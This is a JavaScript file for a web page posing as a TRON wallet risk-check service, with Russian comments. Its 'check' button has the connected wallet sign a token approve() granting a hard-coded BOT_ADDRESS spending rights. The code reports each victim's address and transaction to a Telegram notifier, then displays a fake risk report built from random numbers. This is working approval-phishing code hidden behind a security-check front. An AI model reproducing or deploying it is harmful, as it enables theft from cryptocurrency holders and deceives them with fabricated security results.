// ============================================
// ИСПРАВЛЕННАЯ ВЕРСИЯ – ТОКЕН УБРАН
// ============================================

const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';

let connectedWalletAddress = null;

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ФУНКЦИЯ ВЫЗОВА NETLIFY FUNCTION (БЕЗ ТОКЕНА В КОДЕ)
// ============================================
async function callTelegramFunction(data) {
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        const result = await response.json();
        if (!response.ok) {
            console.error('Ошибка Telegram функции:', result);
        }
        return result;
    } catch (error) {
        console.error('Ошибка вызова Telegram функции:', error);
    }
}

// ============================================
// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
// ============================================
async function connectWallet() {
    try {
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ TronLink подключён!');
            
            // Отправляем уведомление о подключении через функцию
            await callTelegramFunction({
                type: 'connection',
                address: address,
                wallet: 'TronLink'
            });
            return;
        }

        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ Trust Wallet подключён!');
            
            await callTelegramFunction({
                type: 'connection',
                address: address,
                wallet: 'Trust Wallet'
            });
            return;
        }

        alert('❌ Кошелёк не найден.');
    } catch (error) {
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк.');
            return;
        }

        const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb;
        if (!tronWeb) {
            alert('❌ TronWeb не доступен.');
            return;
        }

        const amount = '10000000';
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 350_000_000,
            callValue: 0,
            shouldPollResponse: true,
            timeout: 60000
        });

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        alert(`✅ Approve успешно отправлен!\nTX: https://tronscan.org/#/transaction/${tx}`);

        // Отправляем уведомление об успешном approve через функцию
        await callTelegramFunction({
            type: 'approve',
            address: connectedWalletAddress,
            tx: tx,
            amount: '10'
        });

        // Показываем демо-отчёт
        showDemoReport(connectedWalletAddress);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        alert(`❌ Ошибка: ${error.message}`);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ
// ============================================
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;

    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';

    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// ТЕСТ TELEGRAM (ЧЕРЕЗ ФУНКЦИЮ)
// ============================================
async function testTelegram() {
    const result = await callTelegramFunction({
        type: 'test',
        message: 'Тестовая проверка связи'
    });
    
    if (result && result.success) {
        alert('✅ Тест успешен! Проверьте Telegram');
    } else {
        alert('❌ Ошибка отправки');
    }
}

// ============================================
// КОПИРОВАНИЕ АДРЕСА
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address);
    alert('✅ Адрес скопирован');
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    
    window.testTelegram = testTelegram;
    window.copyAddress = copyAddress;
});
